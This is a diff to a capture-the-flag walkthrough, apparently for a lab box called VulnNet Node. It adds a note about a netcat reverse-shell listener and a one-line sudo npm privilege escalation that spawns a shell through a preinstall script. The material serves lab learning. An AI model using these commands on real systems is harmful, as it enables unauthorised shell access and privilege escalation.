@@ -123,6 +123,8 @@ The output will havea base64 string, copy it and use it as the value for the ses
 
 DON'T forget to start your listener!!!
 
+AND SPECIAL NOTE! On this box we will need to use nano and I was not able to get a stable using `rlwrap` wiht `nc` I had to just use `nc -nvlp 1337` and then use some stablization. 
+
 Refresh the page with the modified cookie:
 
 ![](/assets/images/vn_n/foothold.jpg)
@@ -192,6 +194,11 @@ locate vulnnet-auto.timer.timer
 ls -lah /etc/systemd/system/vulnnet-job.service
 cat /etc/systemd/system/vulnnet-job.service
 ```
+
+It also works as a one-liner!! 
+```
+TF=$(mktemp -d); echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json; chmod 777 -R $TF; sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
+``
 [](/assets/images/vn_n/job-service.jpg)
 
 We need to modify both files.
